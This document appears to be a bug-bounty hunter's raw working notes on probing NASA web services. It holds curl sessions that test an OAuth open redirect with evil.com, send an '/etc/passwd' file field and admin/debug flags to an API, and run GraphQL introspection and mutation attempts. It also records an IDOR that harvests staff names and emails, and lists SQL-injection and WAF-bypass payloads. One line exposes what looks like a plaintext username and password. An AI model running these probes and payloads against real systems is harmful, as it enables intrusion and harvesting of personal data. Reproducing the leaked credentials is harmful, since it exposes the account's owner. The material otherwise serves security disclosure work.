scope [https://usgeo.gov/]

```
https://shapememory.grc.nasa.gov/ 

this endpoint will come soon update feature
```

```
https://wallops-prf.gsfc.nasa.gov
https://ndkswspubp01.ndc.nasa.gov/
https://swodlr.podaac.earthdatacloud.nasa.gov/

somthing in this i think? need more enumeration in it
```

```
# nothing
https://sandbox-dash.uat.earthdatacloud.nasa.gov
https://sams.grc.nasa.gov
https://mmt.uat.earthdata.nasa.gov

```


```
# found but dont work

https://uat.urs.earthdata.nasa.gov/

ajdev@rootbox:~/nassa$ curl -v "https://api.mmt.uat.earthdatacloud.nasa.gov/login?target=//evil.com" 2>&1 | grep -i "location"
< location: https://uat.urs.earthdata.nasa.gov/oauth/authorize?response_type=code&client_id=zFb4tV63ET-V6-oRnDKmJg&redirect_uri=https%3A%2F%2Fapi.mmt.uat.earthdatacloud.nasa.gov%2Furs_callback&state=%257B%2522target%2522%253A%2522%252F%252Fevil.com%2522%257D

ajdev@rootbox:~/nassa$ curl -v "https://api.mmt.uat.earthdatacloud.nasa.gov/login?target=%2F%2Fevil.com" 2>&1 | grep -i "location\|state"
< location: https://uat.urs.earthdata.nasa.gov/oauth/authorize?response_type=code&client_id=zFb4tV63ET-V6-oRnDKmJg&redirect_uri=https%3A%2F%2Fapi.mmt.uat.earthdatacloud.nasa.gov%2Furs_callback&state=%257B%2522target%2522%253A%2522%252F%252Fevil.com%2522%257D4

ajdev@rootbox:~/nassa$ echo "%257B%2522target%2522%253A%2522https%253A%252F%252Fevil.com%2522%257D" | python3 -c "import sys,urllib.parse; print(urllib.parse.unquote(urllib.parse.unquote(sys.stdin.read())))"
{"target":"https://evil.com"}

Resource: https://github.com/nasa/mmt/blob/DRAFT-MMT/app/controllers/application_controller.rb

Register a FREE Earthdata account:
https://urs.earthdata.nasa.gov/users/new
 
 but the site is not open ??
 
 We are in the process of migrating all NASA Earth science data sites into Earthdata from now until end of 2026. Not all NASA Earth science data and resources will appear here until then. Thank you for your patience as we make this transition.


ajdev@rootbox:~/nassa$ curl -v "https://api.mmt.earthdatacloud.nasa.gov/login?target=https://evil.com"
* Host api.mmt.earthdatacloud.nasa.gov:443 was resolved.
* IPv6: (none)
* IPv4: 3.164.182.58, 3.164.182.7, 3.164.182.61, 3.164.182.14
*   Trying 3.164.182.58:443...
* Connected to api.mmt.earthdatacloud.nasa.gov (3.164.182.58) port 443
* ALPN: curl offers h2,http/1.1
* TLSv1.3 (OUT), TLS handshake, Client hello (1):
*  CAfile: /etc/ssl/certs/ca-certificates.crt
*  CApath: /etc/ssl/certs
* TLSv1.3 (IN), TLS handshake, Server hello (2):
* TLSv1.3 (IN), TLS handshake, Encrypted Extensions (8):
* TLSv1.3 (IN), TLS handshake, Certificate (11):
* TLSv1.3 (IN), TLS handshake, CERT verify (15):
* TLSv1.3 (IN), TLS handshake, Finished (20):
* TLSv1.3 (OUT), TLS change cipher, Change cipher spec (1):
* TLSv1.3 (OUT), TLS handshake, Finished (20):
* SSL connection using TLSv1.3 / TLS_AES_128_GCM_SHA256 / X25519 / RSASSA-PSS
* ALPN: server accepted h2
* Server certificate:
*  subject: CN=api.mmt.earthdatacloud.nasa.gov
*  start date: May  8 00:00:00 2025 GMT
*  expire date: Jun  3 23:59:59 2026 GMT
*  subjectAltName: host "api.mmt.earthdatacloud.nasa.gov" matched cert's "api.mmt.earthdatacloud.nasa.gov"
*  issuer: C=US; O=Amazon; CN=Amazon RSA 2048 M03
*  SSL certificate verify ok.
*   Certificate level 0: Public key type RSA (2048/112 Bits/secBits), signed using sha256WithRSAEncryption
*   Certificate level 1: Public key type RSA (2048/112 Bits/secBits), signed using sha256WithRSAEncryption
*   Certificate level 2: Public key type RSA (2048/112 Bits/secBits), signed using sha256WithRSAEncryption
* using HTTP/2
* [HTTP/2] [1] OPENED stream for https://api.mmt.earthdatacloud.nasa.gov/login?target=https://evil.com
* [HTTP/2] [1] [:method: GET]
* [HTTP/2] [1] [:scheme: https]
* [HTTP/2] [1] [:authority: api.mmt.earthdatacloud.nasa.gov]
* [HTTP/2] [1] [:path: /login?target=https://evil.com]
* [HTTP/2] [1] [user-agent: curl/8.5.0]
* [HTTP/2] [1] [accept: */*]
> GET /login?target=https://evil.com HTTP/2
> Host: api.mmt.earthdatacloud.nasa.gov
> User-Agent: curl/8.5.0
> Accept: */*
>
* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
< HTTP/2 307
< content-type: application/json
< content-length: 0
< location: https://urs.earthdata.nasa.gov/oauth/authorize?response_type=code&client_id=QCuabaWMrGyq0OvCj0X-pg&redirect_uri=https%3A%2F%2Fapi.mmt.earthdatacloud.nasa.gov%2Furs_callback&state=%257B%2522target%2522%253A%2522https%253A%252F%252Fevil.com%2522%257D
< date: Tue, 24 Mar 2026 12:43:39 GMT
< x-amzn-remapped-date: Tue, 24 Mar 2026 12:43:39 GMT
< x-amzn-requestid: 3bce3016-6192-4507-be21-4ffe9b58dcce
< x-amzn-remapped-x-amzn-requestid: 610220ab-159d-4589-a7bb-c12eef658e0b
< x-xss-protection: 1; mode=block
< strict-transport-security: max-age=31536000; includeSubDomains; preload
< x-amzn-remapped-content-length: 0
< x-frame-options: SAMEORIGIN
< x-amzn-remapped-connection: keep-alive
< x-amz-apigw-id: auoHWG1eIAMEFcQ=
< x-amzn-remapped-server: Server
< x-content-type-options: nosniff
< x-amzn-trace-id: Root=1-69c286fb-2dd7a6f878a2d998384f62e5;Parent=2fe8f66445fc1e77;Sampled=0;Lineage=1:d0782663:0
< x-amzn-remapped-x-forwarded-for: 45.123.221.227, 3.172.24.47
< x-cache: Miss from cloudfront
< via: 1.1 50670bbe069958a9395e2bcdad1d54d4.cloudfront.net (CloudFront)
< x-amz-cf-pop: MRS53-P1
< x-amz-cf-id: SQD29ZJ_kHCfOUGFHnVlYTxz1R6QLIxTTsuFwkPWbfHvCiThP3ozhw==
<
* Connection #0 to host api.mmt.earthdatacloud.nasa.gov left intact
```

```
s://dispserviceapi-725472350.auto.earthdatacloud.nasa.gov/get_frame_id \
-H "Content-Type: application/json" \
-d '{
  "wkt": "POLYGON((-120 34, -120 36, -118 36, -118 34, -120 34))"
}'
{"frame_ids":["16940","16941","16942","36540","36541","36542"],"wkt":"POLYGON((-120 34, -120 36, -118 36, -118 34, -120 34))"}


ajdev@rootbox:~$ curl -X POST "https://dispserviceapi-725472350.auto.earthdatacloud.nasa.gov/timeseries" \
-H "Content-Type: application/json" \
-d '{
  "wkt": "POLYGON((-120 34, -120 36, -118 36, -118 34, -120 34))",
  "bucket": "test",
  "frameId": "16940",
  "admin": true,
  "debug": true,
  "file": "/etc/passwd"
}'
{"detail":"No data found for the given area of interest POLYGON((-120 34, -120 36, -118 36, -118 34, -120 34))"}

ajdev@rootbox:~$ curl -X POST "https://dispserviceapi-725472350.auto.earthdatacloud.nasa.gov/timeseries" -H "Content-Type: applicacurl -X POST "https://dispserviceapi-725472350.auto.earthdatacloud.nasa.gov/timeseries" -H "Content-Type: application/json" -d '{
  "wkt": "POLYGON((-120 34, -120 36, -118 36, -118 34, -120 34))",
  "bucket": {"test":"abc"},
  "frameId": "12345",
  "admin": true,
  "debug": true,
  "file": "/etc/passwd"
}'
{"detail":[{"type":"string_type","loc":["body","bucket"],"msg":"Input should be a valid string","input":{"test":"abc"},"url":"https://errors.pydantic.dev/2.11/v/string_type"}]}

ajdev@rootbox:~$ curl -X POST "https://dispserviceapi-725472350.aucurl -X POST "https://dispserviceapi-725472350.auto.earthdatacloud.nasa.gov/frame_intersection" \
-H "Content-Type: application/json" \
-d '{
  "wkt": "POLYGON((-120 34, -120 36, -118 36, -118 34, -120 34))"
}'
{"16940":"POLYGON ((-118.861808 34.035838, -118.858161 34.03643, -118.893701 34.188645, -118.935791 34.368557, -118.456511 34.445987, -118.039508 34.511822, -118.050184 34.559725, -118 34.56740221209699, -118 34, -118.853455424711 34, -118.861808 34.035838))","16941":"POLYGON ((-118.9713 34.520003, -119.010177 34.685506, -119.049391 34.852101, -119.088723 35.018849, -119.128054 35.18524, -119.170562 35.364692, -119.169995 35.364782, -119.206014 35.530987, -119.245567 35.697287, -118.758293 35.774648, -118.334611 35.840296, -118.345432 35.888174, -118 35.93996710495309, -118 34.30753528707505, -118.411102 34.24676, -118.890234 34.173827, -118.932538 34.354653, -118.9713 34.520003))","16942":"POLYGON ((-119.28157 35.848296, -119.31780902959349 36, -118 36, -118 35.74713986553674, -118.274912 35.708147, -118.259786 35.641067, -118.712193 35.575436, -119.199257 35.502579, -119.241734 35.681173, -119.28157 35.848296))","36540":"POLYGON ((-119.653335 34.851813, -119.206816 34.918109, -119.219457 34.977844, -118.778815 35.041923, -118.354373 35.102135, -118.321064 34.936283, -118.321061 34.936283, -118.317708 34.919572, -118.313238 34.897314, -118.313242 34.897313, -118.287784 34.770424, -118.28778 34.770425, -118.283911 34.751125, -118.279966 34.73146, -118.27997 34.73146, -118.254534 34.604559, -118.25453 34.60456, -118.250242 34.583147, -118.246725 34.5656, -118.246728 34.5656, -118.213514 34.399733, -118.21501 34.399535, -118.189613 34.272599, -118.18961 34.272599, -118.186459 34.256835, -118.181823 34.233665, -118.181827 34.233664, -118.156451 34.106713, -118.156447 34.106714, -118.152448 34.08669, -118.148669 34.067785, -118.148672 34.067785, -118.1351350744784 34, -120 34, -120 34.798951048118056, -119.653335 34.851813))","36541":"POLYGON ((-118.519184 35.931599, -118.519179 35.9316, -118.519098 35.931175, -118.511299 35.892578, -118.51173 35.892522, -118.480081 35.72648, -118.480085 35.72648, -118.454508 35.599648, -118.454504 35.599649, -118.450312 35.578841, -118.446646 35.56066, -118.44665 35.56066, -118.421098 35.433816, -118.421094 35.433817, -118.417266 35.414793, -118.413245 35.394834, -118.413249 35.394833, -118.387721 35.267978, -118.387717 35.267979, -118.383676 35.247879, -118.379877 35.229, -118.379881 35.229, -118.354376 35.102135, -118.354373 35.102135, -118.351015 35.085416, -118.346541 35.06316, -118.346545 35.063159, -118.313238 34.897314, -118.737539 34.841668, -119.150402 34.785893, -119.13855 34.729763, -119.61246 34.663516, -120 34.60760464823284, -120 36, -118.5330052285401 36, -118.519184 35.931599))","36542":"POLYGON ((-119.899342 35.991632, -120 35.97740204325512, -120 36, -119.83815015878123 36, -119.899342 35.991632))"}ajdev@rootbox:~$


```



```
## Summary
The /login endpoint accepts an unvalidated `target` parameter that is 
stored directly in the OAuth state. After successful login, the 
/urs_callback endpoint reads this value and redirects the user to it 
without any domain validation, allowing redirection to external sites.

## Proof of Concept

Command:
curl -v "https://api.mmt.earthdatacloud.nasa.gov/login?target=https://bugcrowd.com"

Response:
HTTP/2 307
Location: https://urs.earthdata.nasa.gov/oauth/authorize?response_type=code
&client_id=QCuabaWMrGyq0OvCj0X-pg
&redirect_uri=https%3A%2F%2Fapi.mmt.earthdatacloud.nasa.gov%2Furs_callback
&state=%257B%2522target%2522%253A%2522https%253A%252F%252Fbugcrowd.com%2522%257D

Decoded state confirms external URL stored unvalidated:
{"target":"https://bugcrowd.com"}

Same behavior confirmed on UAT:
curl -v "https://api.mmt.uat.earthdatacloud.nasa.gov/login?target=https://bugcrowd.com"
Decoded state: {"target":"https://bugcrowd.com"}

## Steps to Reproduce
1. Visit https://api.mmt.earthdatacloud.nasa.gov/login?target=https://bugcrowd.com
2. Server returns 307 redirect to NASA OAuth login
3. Complete OAuth login with valid Earthdata credentials
4. After login /urs_callback reads target from state and redirects to bugcrowd.com

## Impact
An attacker can send a crafted login URL to NASA MMT users. Because 
the redirect starts from the legitimate NASA OAuth page, victims 
have no reason to suspect the link. After logging in with real NASA 
credentials they are silently redirected to an attacker-controlled 
site enabling phishing and session token theft.

## Affected Endpoints
- https://api.mmt.earthdatacloud.nasa.gov/login
- https://api.mmt.uat.earthdatacloud.nasa.gov/login

## Source Code Reference
https://github.com/nasa/mmt/blob/master/app/controllers/application_controller.rb

  def redirect_after_login
    return_to = session.delete(:return_to)
    redirect_to return_to || last_point || internal_landing_page
  end

No validation applied to return_to before redirect.

## Remediation
Validate target against an allowlist of trusted domains 
(*.nasa.gov, *.earthdata.nasa.gov) before storing in session.
```



```
ajdev@rootbox:~$ curl -s -I https://www.jpl.nasa.gov/newsletter-signup/ | grep -i "content-security-policy" | tr ';' '\n' | grep -iE "127.0.0.1|localhost|54.212"
 frame-ancestors 'self' http://localhost:8000/ http://localhost:3000/ https://*.jpl.nasa.gov/ https://*.nasa.gov/
 img-src 'self' https://www.googletagmanager.com/ https://i.ytimg.com/ https://www.google-analytics.com/ https://app.icontact.com/ http://localhost:3000/ http://127.0.0.1:9000/ https://*.cloudfront.net/ https://*.jpl.nasa.gov/ https://*.nasa.gov/ data:
 script-src 'self' blob: https://eyes.nasa.gov/ http://localhost:3000/ https://cdnjs.cloudflare.com/ https://script.crazyegg.com/ https://tracking.crazyegg.com/ https://www.surveymonkey.com/ https://www.google.com/ https://www.gstatic.com/ https://www.google-analytics.com/ https://www.googletagmanager.com/ https://dap.digitalgov.gov/ https://app.icontact.com/ https://*.nasa.gov/ https://*.jpl.nasa.gov/ 'unsafe-eval' 'unsafe-inline'
 frame-src 'self' http://localhost:3000/ https://td.doubleclick.net/ https://www.youtube.com/ https://*.google.com/ https://player.vimeo.com/ https://www.soundcloud.com/ https://www.surveymonkey.com/ https://d2pn8kiwq2w21t.cloudfront.net/ https://*.github.com/ https://eyes.nasa.gov/ https://*.nasa.gov/ https://*.jpl.nasa.gov/ 'unsafe-inline'
 connect-src 'self' http://localhost:3000/ https://stats.g.doubleclick.net/ https://script.crazyegg.com/ https://tracking.crazyegg.com/ https://app.icontact.com/ https://www.google-analytics.com/ https://analytics.google.com/ http://54.212.171.253/ https://docs.google.com/ https://dap.digitalgov.gov/ https://app.icontact.com/ https://*.cloudfront.net/ https://*.nasa.gov/ https://*.jpl.nasa.gov/ https://www.google.com/recaptcha/ https://*.execute-api.us-gov-west-1.amazonaws.com/
 media-src 'self' http://localhost:3000/ https://*.cloudfront.net/ http://127.0.0.1:9000/ 'unsafe-eval' 'unsafe-inline'
 
 http://54.212.171.253
 http://54.212.171.253:9000/
 http://54.212.171.253:3000/
```

```
ajdev@rootbox:~$ curl -v "https://api.mmt.uat.earthdatacloud.nasa.gov/login?target=https://bugcrowd.com" 2>&1 | grep -i "location"
< location: https://uat.urs.earthdata.nasa.gov/oauth/authorize?response_type=code&client_id=zFb4tV63ET-V6-oRnDKmJg&redirect_uri=https%3A%2F%2Fapi.mmt.uat.earthdatacloud.nasa.gov%2Furs_callback&state=%257B%2522target%2522%253A%2522https%253A%252F%252Fbugcrowd.com%2522%257D
```

```
devbahadur
Sanjayrai4145@
```

when i go to https://api.mmt.uat.earthdatacloud.nasa.gov/login?target=https://bugcrowd.com 

it redirect to :

![[Pasted image 20260326072417.png]]

and then login it by the account of EOSDIS Earthdata:

![[Pasted image 20260326074205.png]]



```
Hi Mason357_Bugcrowd,

I have additional evidence that upgrades this finding.

After completing a full OAuth login flow with a real 
Earthdata account, I confirmed the target parameter 
successfully reaches /auth-callback:

BURP CAPTURED REQUEST:
GET /auth-callback?target=https%3A%2F%2Fbugcrowd.com
Host: mmt.earthdata.nasa.gov

BROWSER URL AFTER LOGIN:
mmt.earthdata.nasa.gov/unauthorizedAccess?errorType=deniedNonNasaAccessMMT

This confirms:
1. OAuth flow completed successfully
2. target=https://bugcrowd.com carried through entire 
   OAuth flow unvalidated
3. /auth-callback received the external URL

The only reason I landed on an error page is because 
my test account is not a real NASA MMT employee. For 
a legitimate NASA MMT user with proper permissions, 
/auth-callback would redirect them to 
https://bugcrowd.com (or any attacker domain).

This is a confirmed post-authentication open redirect 
targeting real NASA employees.

Requesting severity upgrade from P5 to P3.

Attaching Burp screenshot and browser error screenshot 
as proof.
```



```
{"query": "{__schema{queryType{name}mutationType{name}types{name kind description fields{name description type{name kind ofType{name kind}}}}}}"}

{"query": "{__schema{mutationType{name fields{name description}}}}"}

{"query": "{__schema{types{name}}}"}


ajdev@rootbox:~$ curl -X POST "https://hitide.profile.podaac.earthdatacloud.nasa.gov/hitide/api/cmr/graphql" -H "Content-Type: application/json" --http2 -d '{"query":"{__type(name:\"DraftConceptType\"){enumValues{name}}}"}'
{"data":{"__type":{"enumValues":[{"name":"Citation"},{"name":"Collection"},{"name":"Service"},{"name":"Tool"},{"name":"Variable"},{"name":"Visualization"}]}}}

ajdev@rootbox:~$ curl -X POST "https://hitide.profile.podaac.earthdatacloud.nasa.gov/hitide/api/cmr/graphql" \
-H "Content-Type: application/json" \
--http2 \
-d '{"query":"{drafts(params:{conceptType:Collection}){count}}"}'
{"data":{"drafts":{"count":0}}}

ajdev@rootbox:~$ curl -X POST "https://hitide.profile.podaac.earthdatacloud.nasa.gov/hitide/api/cmr/graphql" -H "Content-Type: application/json" --http2 -d '{"query":"{acls{count items{name}}}"}'
{"errors":[{"message":"No token provided","locations":[{"line":1,"column":2}],"path":["acls"],"extensions":{"code":"CMR_ERROR","stacktrace":["GraphQLError: No token provided","    at _n (/var/task/index.js:4920:10099)","    at ku.parse (/var/task/index.js:4920:18580)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async Object.Lye [as aclSourceFetch] (/var/task/index.js:4920:20234)","    at async r (/var/task/index.js:5024:39778)"]}}],"data":null}
ajdev@rootbox:~$ curl -X POST "https://hitide.profile.podaac.earthdatacloud.nasa.gov/hitide/api/cmr/graphql" -H "Content-Type: application/json" --http2 -d '{"query":"{groups(params:{}){count}}"}'
{"errors":[{"message":"Field \"GroupsInput.tags\" of required type \"[String!]!\" was not provided.","locations":[{"line":1,"column":16}],"extensions":{"code":"GRAPHQL_VALIDATION_FAILED","stacktrace":["GraphQLError: Field \"GroupsInput.tags\" of required type \"[String!]!\" was not provided.","    at Object.ObjectValue (/var/task/index.js:53:53894)","    at Object.enter (/var/task/index.js:22:25078)","    at Object.enter (/var/task/index.js:53:12805)","    at LAe (/var/task/index.js:22:24254)","    at wLe (/var/task/index.js:53:62775)","    at AY (/var/task/index.js:611:4885)","    at async DI (/var/task/index.js:611:26142)","    at async CI (/var/task/index.js:598:16567)","    at async nY (/var/task/index.js:610:1012)","    at async e.executeHTTPGraphQLRequest (/var/task/index.js:611:24428)"]}}]}
ajdev@rootbox:~$ curl -X POST "https://hitide.profile.podaac.earthdatacloud.nasa.gov/hitide/api/cmr/graphql" -H "Content-Type: application/json" --http2 -d '{"query":"{permissions(params:{}){count}}"}'
{"errors":[{"message":"One of [concept_id], [system_object], [target_group_id], or [provider] and [target] are required.,One of parameters [user_type] or [user_id] are required.","locations":[{"line":1,"column":2}],"path":["permissions"],"extensions":{"code":"CMR_ERROR","stacktrace":["GraphQLError: One of [concept_id], [system_object], [target_group_id], or [provider] and [target] are required.,One of parameters [user_type] or [user_id] are required.","    at _n (/var/task/index.js:4920:10099)","    at J2.parse (/var/task/index.js:4920:18580)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async Object.Xve [as permissionSource] (/var/task/index.js:5024:1081)","    at async r (/var/task/index.js:5024:39778)"]}}],"data":null}
ajdev@rootbox:~$ curl -X POST "https://hitide.profile.podaac.earthdatacloud.nasa.gov/hitide/api/cmr/graphql" -H "Content-Type: application/json" --http2 -d '{"query":"{subscriptions(params:{}){count}}"}'
{"data":{"subscriptions":{"count":0}}}
```

#focus

```
POST /hitide/api/cmr/graphql HTTP/2
Host: hitide.profile.podaac.earthdatacloud.nasa.gov
Accept: */*
Access-Control-Request-Method: POST
Content-Type: application/json
Access-Control-Request-Headers: content-type
Origin: https://hitide.podaac.earthdatacloud.nasa.gov
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
Sec-Fetch-Dest: empty
Referer: https://hitide.podaac.earthdatacloud.nasa.gov/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=1, i
Content-Length: 72

{"query": "{__schema{mutationType{name fields{name description}}}}"}
```

```
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
Server: CloudFront
Date: Thu, 26 Mar 2026 12:34:33 GMT
Content-Security-Policy: default-src 'self';base-uri 'self';font-src 'self' https: data:;form-action 'self';frame-ancestors 'self';img-src 'self' data:;object-src 'none';script-src 'self';script-src-attr 'none';style-src 'self' https: 'unsafe-inline';upgrade-insecure-requests
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Resource-Policy: same-origin
Origin-Agent-Cluster: ?1
Referrer-Policy: no-referrer
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
X-Content-Type-Options: nosniff
X-Dns-Prefetch-Control: off
X-Download-Options: noopen
X-Frame-Options: SAMEORIGIN
X-Permitted-Cross-Domain-Policies: none
X-Xss-Protection: 0
Access-Control-Allow-Origin: https://hitide.podaac.earthdatacloud.nasa.gov
Access-Control-Allow-Credentials: true
Access-Control-Allow-Headers: content-type
X-Request-Id: 1zfIF6vIljveLX-cSe_aUSedZzbz45LkNlltJa0TW-JecAcsI3uOPQ==
X-Cache: Miss from cloudfront
Via: 1.1 3583c52a4f3fc89edf67d0227071f338.cloudfront.net (CloudFront)
X-Amz-Cf-Pop: LHR82-P2
X-Amz-Cf-Id: 1zfIF6vIljveLX-cSe_aUSedZzbz45LkNlltJa0TW-JecAcsI3uOPQ==

{"data":{"__schema":{"mutationType":{"name":"Mutation","fields":[{"name":"createAcl","description":"Create a new Acl."},{"name":"updateAcl","description":"Update an existing Acl."},{"name":"deleteAcl","description":"Delete an existing Acl."},{"name":"createAssociation","description":"Create a new Association."},{"name":"deleteAssociation","description":"Delete an existing Association."},{"name":"restoreCollectionRevision","description":"Restores a collection to a previous revision."},{"name":"deleteCollection","description":"Deletes a collection."},{"name":"restoreCitationRevision","description":null},{"name":"deleteCitation","description":null},{"name":"ingestDraft","description":"Ingest a draft."},{"name":"deleteDraft","description":"Delete a draft."},{"name":"publishDraft","description":"Publish a draft."},{"name":"createGroup","description":"Create a new group."},{"name":"deleteGroup","description":"Delete a group."},{"name":"updateGroup","description":"Update a group."},{"name":"createOrderOption","description":"Create a new order option."},{"name":"updateOrderOption","description":"Update an existing order option."},{"name":"deleteOrderOption","description":"Delete an existing order option."},{"name":"restoreServiceRevision","description":"Restore a service revision."},{"name":"deleteService","description":"Delete a service."},{"name":"createSubscription","description":"Create a new subscription."},{"name":"updateSubscription","description":"Update an existing subscription."},{"name":"deleteSubscription","description":"Delete an existing subscription."},{"name":"restoreToolRevision","description":"Restore a tool revision."},{"name":"deleteTool","description":"Delete a tool."},{"name":"publishGeneratedVariables","description":"Publish generated variables."},{"name":"restoreVariableRevision","description":"Restore a variable revision."},{"name":"deleteVariable","description":"Delete a variable."},{"name":"restoreVisualizationRevision","description":null},{"name":"deleteVisualization","description":null}]}}}}
```


```
ajdev@rootbox:~$ curl -X POST "https://hitide.profile.podaac.earthdatacloud.nasa.gov/hitide/api/cmr/graphql" -H "Content-Type: application/json" --http2 -d '{"query":"mutation { createSubscription(params:{name:\"test\", query:\"test\", type:\"test\"}){__typename} }"}'
{"errors":[{"message":"#/Type: test is not a valid enum value","locations":[{"line":1,"column":12}],"path":["createSubscription"],"extensions":{"code":"CMR_ERROR","stacktrace":["GraphQLError: #/Type: test is not a valid enum value","    at _n (/var/task/index.js:4920:10099)","    at Hd.parseIngest (/var/task/index.js:4920:18275)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async Object.M2e [as subscriptionSourceIngest] (/var/task/index.js:5024:29576)","    at async Object.createSubscription (/var/task/index.js:644:36821)","    at async r (/var/task/index.js:5024:39778)"]}}],"data":{"createSubscription":null}}
ajdev@rootbox:~$ curl -X POST "https://hitide.profile.podaac.earthdatacloud.nasa.gov/hitide/api/cmr/graphql" \
-H "Content-Type: application/json" \
--http2 \
-d '{"query":"{__type(name:\"SubscriptionType\"){enumValues{name}}}"}'
{"data":{"__type":null}}
ajdev@rootbox:~$ curl -X POST "https://hitide.profile.podaac.earthdatacloud.nasa.gov/hitide/api/cmr/graphql" \
-H "Content-Type: application/json" \
--http2 \
-d '{"query":"mutation { createSubscription(params:{name:\"test\", query:\"test\", type:VALID_ENUM_HERE}){__typename} }"}'
{"errors":[{"message":"String cannot represent a non string value: VALID_ENUM_HERE","locations":[{"line":1,"column":71}],"extensions":{"code":"GRAPHQL_VALIDATION_FAILED","stacktrace":["GraphQLError: String cannot represent a non string value: VALID_ENUM_HERE","    at E6.parseLiteral (/var/task/index.js:49:20801)","    at xp (/var/task/index.js:53:54890)","    at Object.EnumValue (/var/task/index.js:53:54539)","    at Object.enter (/var/task/index.js:22:25078)","    at Object.enter (/var/task/index.js:53:12805)","    at LAe (/var/task/index.js:22:24254)","    at wLe (/var/task/index.js:53:62775)","    at AY (/var/task/index.js:611:4885)","    at async DI (/var/task/index.js:611:26142)","    at async CI (/var/task/index.js:598:16567)"]}}]}
ajdev@rootbox:~$ curl -X POST "https://hitide.profile.podaac.earthdatacloud.nasa.gov/hitide/api/cmr/graphql" \
-H "Content-Type: application/json" \
--http2 \
-d '{"query":"mutation { createSubscription(params:{name:\"test\", query:\"test\", type:\"email\"}){__typename} }"}'
{"errors":[{"message":"#/Type: email is not a valid enum value","locations":[{"line":1,"column":12}],"path":["createSubscription"],"extensions":{"code":"CMR_ERROR","stacktrace":["GraphQLError: #/Type: email is not a valid enum value","    at _n (/var/task/index.js:4920:10099)","    at Hd.parseIngest (/var/task/index.js:4920:18275)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async Object.M2e [as subscriptionSourceIngest] (/var/task/index.js:5024:29576)","    at async Object.createSubscription (/var/task/index.js:644:36821)","    at async r (/var/task/index.js:5024:39778)"]}}],"data":{"createSubscription":null}}
```


NASA CCE API Enumeration

```
Domain: https://cce.nasa.gov
Endpoint: /cgi-bin/profile_slides/member_unislideover.pl

Full Request Example: GET /cgi-bin/profile_slides/member_unislideover.pl?programid=1&itemid=10088

The application exposes user profile data via a predictable numeric parameter (itemid) without authentication.

This allows:

- Unauthorized access to user data
- Enumeration of multiple users
- Extraction of sensitive information (emails, affiliations)
  
1. IDOR (Insecure Direct Object Reference)
   
2. User Enumeration:

Sequential IDs: 10087,10088,10090
Missing IDs return: 0

3. Information Disclosure

Extracted data includes:

- Full Name
- Organization (NASA / USGS)
- Email address
  
Sample Response

{
  "title": "James (Jim) Smith",
  "items": [
    "NASA GSFC<br>USA<br><a href=\"mailto:james.a.smith@nasa.gov\">Email</a>"
  ]
}


Proof of Concept:

?programid=1&itemid=10088

itemid=10088 → Valid user
itemid=10090 → Different user
itemid=10087 → Another user
itemid=10000 → No data


```

```
This is where real pentesting starts: WAF Bypass

?programid=1&itemid=10088

1. No-space bypass
   
10088/**/AND/**/1=1
<html><body><h2>Error!</h2><p>This application has encountered an error.  Contact <a   href="mailto:support@cce.nasa.gov">website support</a> for assistance.</a>

10088%09AND%091=1
10088%0aAND%0a1=1

2. Inline comment trick
   
10088'/**/AND/**/1=1-- 
<html><body><h2>Error!</h2><p>This application has encountered an error.  Contact <a   href="mailto:support@cce.nasa.gov">website support</a> for assistance.</a>

3. Encoded payload
   
10088%20AND%201=1
<html><body><h2>Error!</h2><p>This application has encountered an error.  Contact <a   href="mailto:support@cce.nasa.gov">website support</a> for assistance.</a>

4. Use arithmetic instead (very smart)
   
itemid=10088+1
<html><body><h2>Error!</h2><p>This application has encountered an error.  Contact <a   href="mailto:support@cce.nasa.gov">website support</a> for assistance.</a>

itemid=10088-1
itemid=10088*1
<html><body><h2>Error!</h2><p>This application has encountered an error.  Contact <a   href="mailto:support@cce.nasa.gov">website support</a> for assistance.</a>


4. Try breaking logic without keywords
   
itemid=10088'
<html><body><h2>Error!</h2><p>This application has encountered an error.  Contact <a   href="mailto:support@cce.nasa.gov">website support</a> for assistance.</a>

itemid=10088''
Keep-Alive: timeout=15, max=100
Connection: Keep-Alive
Content-Type: application/json; charset=ISO-8859-1
Content-Length: 162

<html><body><h2>Error!</h2><p>This application has encountered an error.  Contact <a   href="mailto:support@cce.nasa.gov">website support</a> for assistance.</a>

itemid=10088'''


IDOR + Bulk Data Extraction

Strong P3 Path

You can already:

- Enumerate users (`itemid`)
- Extract:
    - Names
    - Emails
    - Organizations
      

```


```
ajdev@rootbox:~/nassa$ curl "https://ssd-api.jpl.nasa.gov/scout.api" | python3 -m json.tool | grep objectName
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 10452    0 10452    0     0   7755      0 --:--:--  0:00:01 --:--:--  7759
            "objectName": "A11z2Ek",
            "objectName": "A11zrA3",
            "objectName": "A11ztfv",
            "objectName": "C1CWP45",
            "objectName": "C1DW8J5",
            "objectName": "C1DX145",
            "objectName": "C1E21V5",
            "objectName": "C1E4UV5",
            "objectName": "C1E87L5",
            "objectName": "C1E8ZG5",
            "objectName": "C1E9A15",
            "objectName": "C1E9H35",
            "objectName": "C1ECHV5",
            "objectName": "C1EDJ35",
            "objectName": "C1EG4F5",
            "objectName": "C1EGNW5",
            "objectName": "C1EHWQ5",
            "objectName": "C1EHWT5",
            "objectName": "C1EJK35",
            "objectName": "CEFL3M2",
            "objectName": "CEFXDG2",
            "objectName": "JJDS467",
            "objectName": "RdSH491",
            "objectName": "Sar2887",
            "objectName": "ZTF10Ct",
            "objectName": "ZTF10Cw",
            "objectName": "ZTF10DC",
            "objectName": "ZTF10DD",
            

ajdev@rootbox:~/nassa$ curl "https://ssd-api.jpl.nasa.gov/scout.api?tdes=A11z2Ek&file=log"
